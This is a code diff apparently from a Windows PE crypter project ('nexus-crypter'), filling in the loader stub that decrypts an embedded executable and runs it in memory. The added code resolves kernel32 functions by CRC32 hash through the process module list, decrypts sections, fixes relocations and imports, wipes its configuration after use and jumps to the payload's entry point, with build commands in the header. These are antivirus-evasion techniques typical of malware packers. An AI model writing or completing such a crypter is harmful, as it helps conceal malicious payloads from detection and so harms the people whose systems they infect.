@@ -27,7 +27,15 @@
 *   * checksum recalculation
 *   * pe section manipulation
 *
+*   Compile:
+*   .\gcc.exe stub.c -o stub.o [-DDEBUG] -fno-asynchronous-unwind-tables -fno-ident -fno-stack-protector
+*   .\ld.exe stub.o -o stub.exe -nostdlib --build-id=none -s --entry=_start
+*   .\objcopy.exe -O binary stub.exe stub.bin
+*   .\windres.exe resource.rc -o resource.o 
+*   .\gcc.exe nexus-crypter.c resource.o -o nexus-crypter.exe -lbcrypt
+*
 */
+
 #include <windows.h>
 #include <stdint.h>
 #include <string.h>
@@ -83,10 +91,9 @@ typedef struct _STUB_RUNTIME {
     fn_GetProcAddress pGetProcAddress;
 } STUB_RUNTIME;
 
-/* needed when adding BCF (bogus control flow) */
-// __attribute__((naked, used)) void ___chkstk_ms(void) {
-//     __asm__ volatile ("ret\n");
-// }
+__attribute__((naked, used)) void ___chkstk_ms(void) {
+    __asm__ volatile ("ret\n");
+}
 
 static uint32_t crc32_hash_str(const char* str) {
     uint32_t crc = 0xFFFFFFFF;
@@ -113,7 +120,18 @@ void resolve_imports(STUB_RUNTIME* rt) {
     void* k32 = NULL;
     
     for (int i = 0; i < 10; i++) {
-        /* loop through and hash all of the loaded modules to find our dlls */
+        current = *(void**)current;
+        if (current == list_head) break;
+        void* base = *(void**)((uint8_t*)current + 0x20);
+        if (!base) continue;
+        wchar_t* n = *(wchar_t**)((uint8_t*)current + 0x50);
+        uint16_t l = *(uint16_t*)((uint8_t*)current + 0x48) / 2;
+        char name[64];
+        int j;
+        for (j = 0; j < l && j < 63; j++) name[j] = (char)n[j];
+        name[j] = 0;
+        uint32_t h = crc32_hash_str(name);
+        if (h == 0xB37B13DA) { k32 = base; break; }
     }
 
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)k32;
@@ -125,10 +143,19 @@ void resolve_imports(STUB_RUNTIME* rt) {
     uint16_t* ordinals = (uint16_t*)(k32 + exports->AddressOfNameOrdinals);
     uint32_t* functions = (uint32_t*)(k32 + exports->AddressOfFunctions);
 
-	/* now parse the export table for each function */
+    for (uint32_t j = 0; j < exports->NumberOfNames; j++) {
+        char* ename = (char*)(k32 + names[j]);
+        uint32_t h = crc32_hash_str(ename);
+        if (h == 0xDAEC3C14)      rt->pVirtualAlloc = (fn_VirtualAlloc)(k32 + functions[ordinals[j]]);
+        else if (h == 0x796AECA9) rt->pVirtualProtect = (fn_VirtualProtect)(k32 + functions[ordinals[j]]);
+        else if (h == 0x26F919CC) rt->pVirtualFree = (fn_VirtualFree)(k32 + functions[ordinals[j]]);
+        else if (h == 0x35228EDA) rt->pOutputDebugStringA = (fn_OutputDebugStringA)(k32 + functions[ordinals[j]]);
+        else if (h == 0x41D65003) rt->pGetModuleHandleA = (fn_GetModuleHandleA)(k32 + functions[ordinals[j]]);
+        else if (h == 0x794CF7AA) rt->pGetProcAddress = (fn_GetProcAddress)(k32 + functions[ordinals[j]]);
+        else if (h == 0x839EC179) rt->pLoadLibraryA = (fn_LoadLibraryA)(k32 + functions[ordinals[j]]);
+    }
 }
 
-/* try GetModuleHandleA first in case Windows has already loaded it into the PEB */
 void resolve_payload_imports(uint8_t* target_base, STUB_CONFIG* config, STUB_RUNTIME* rt) {
     if (!config->import_rva || !rt->pLoadLibraryA || !rt->pGetProcAddress) {
 	    return;
@@ -161,7 +188,6 @@ void resolve_payload_imports(uint8_t* target_base, STUB_CONFIG* config, STUB_RUN
     }
 }
 
-/* relocations are extremely finnicky, access violations galore! */
 void apply_relocations(uint8_t* current_base, uint8_t* original_image_base, IMAGE_DATA_DIRECTORY* reloc_dir, size_t image_size) {
     if (reloc_dir->VirtualAddress == 0 || reloc_dir->Size == 0) {
         return;
@@ -191,8 +217,6 @@ void apply_relocations(uint8_t* current_base, uint8_t* original_image_base, IMAG
     }
 }
 
-/* sometimes the relocations table in the executable isn't enough, and we need to
-   brute-force any remaining pointers that haven't been relocated to avoid crashes */
 void manual_relocations(uint8_t* base, uint8_t* preferred_base, size_t image_size) {
     int64_t delta = (int64_t)base - (int64_t)preferred_base;
     if (delta == 0) return;
@@ -330,9 +354,6 @@ void stub_main(STUB_CONFIG* config) {
     uint8_t* encrypted = actual_base + config->sections_rva;
     uint8_t* decrypted = (uint8_t*)buffer;
     
-	/* high-entropy deobfuscation requires the data to be layed out
-	   exactly how it was when originally obfuscated. this is why we
-	   need the section infos 										*/
     SECTION_INFO* section_infos = (SECTION_INFO*)((uint8_t*)config + sizeof(STUB_CONFIG) + 4);
     for (uint8_t i = 0; i < config->section_count; i++) {
         if (section_infos[i].raw_size == 0) continue;
@@ -361,8 +382,6 @@ void stub_main(STUB_CONFIG* config) {
     IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(target_base + dos->e_lfanew);
     IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
 
-	/* zero-fill sections that require it. this is usually the windows 
-	   loaders job 													   */
     for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++) {
         if (sec[i].SizeOfRawData == 0 && sec[i].Misc.VirtualSize > 0) {
             uint8_t* bss = target_base + sec[i].VirtualAddress;
@@ -378,15 +397,18 @@ void stub_main(STUB_CONFIG* config) {
     restore_directories_and_relocate(&rt, config, nt, target_base);
     resolve_payload_imports(target_base, config, &rt);
     apply_section_permissions(&rt, target_base, nt, sec);
-    tls_callbacks(target_base, config->tls_rva, &rt);
+
+    if (config->tls_rva != 0) {
+        tls_callbacks(target_base, config->tls_rva, &rt);
+    }
 
     void (*original_entry)() = (void(*)())(target_base + config->original_oep);
 
     DWORD old_prot; 
     size_t config_zone = sizeof(STUB_CONFIG) + 4 + 
                         (sizeof(SECTION_INFO) * config->section_count);
-    rt.pVirtualProtect(config, config_zone , PAGE_READWRITE, &old_prot);
-    SecureWipe((unsigned char*)config, config_zone);
+    rt.protect(config, config_zone , PAGE_READWRITE, &old_prot);
+    overwrite((unsigned char*)config, config_zone);
 
     original_entry();
 }
@@ -396,15 +418,23 @@ static volatile uint32_t MARKER_VALUE = 0xDEADBEEF;
 __attribute__((noinline))
 void position_independent_entry(void) {
     void* return_addr = __builtin_return_address(0);
-	/* starting from the return address, search memory for our marker
-	   defined above 												  */
-	
+    uint8_t* marker_location = (uint8_t*)return_addr;
+    uint8_t* x = (uint8_t*)&MARKER_VALUE;
+    int count = 0;
+    while (1) {
+        if (marker_location[0] == x[0] && marker_location[1] == x[1] && 
+            marker_location[2] == x[2] && marker_location[3] == x[3]) {
+            count++;
+            if (count == 2) break;
+        }
+        marker_location++;
+    }
+    STUB_CONFIG* config = (STUB_CONFIG*)(marker_location - sizeof(STUB_CONFIG));
     stub_main(config);
 }
 
 __attribute__((naked)) int _start() {
     __asm__ volatile (
-		/* by far the hardest part to get right */
         ".byte 0x0F, 0x0B, 0x0F, 0x0B, 0x0F, 0x0B\n"
         "and rsp, 0xFFFFFFFFFFFFFFF0\n"
         "sub rsp, 0x20\n"               
